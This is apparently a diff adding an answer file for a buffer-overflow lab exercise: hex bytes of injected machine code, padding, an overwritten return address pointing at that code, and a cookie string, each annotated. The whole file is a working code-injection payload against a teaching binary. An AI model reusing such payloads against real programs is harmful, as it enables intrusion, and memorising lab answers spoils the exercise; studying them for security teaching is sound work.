@@ -1,0 +1,7 @@
+8b 3c 25 a8 dc 61 55 ff /* rsp, has inject code in level2.d */ 
+34 25 fa 18 40 00 c3 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00 /* return address to inject code */ 
+35 39 62 39 39 37 66 61 00 /* input string of cookie, saved in test stack, above return address */ 
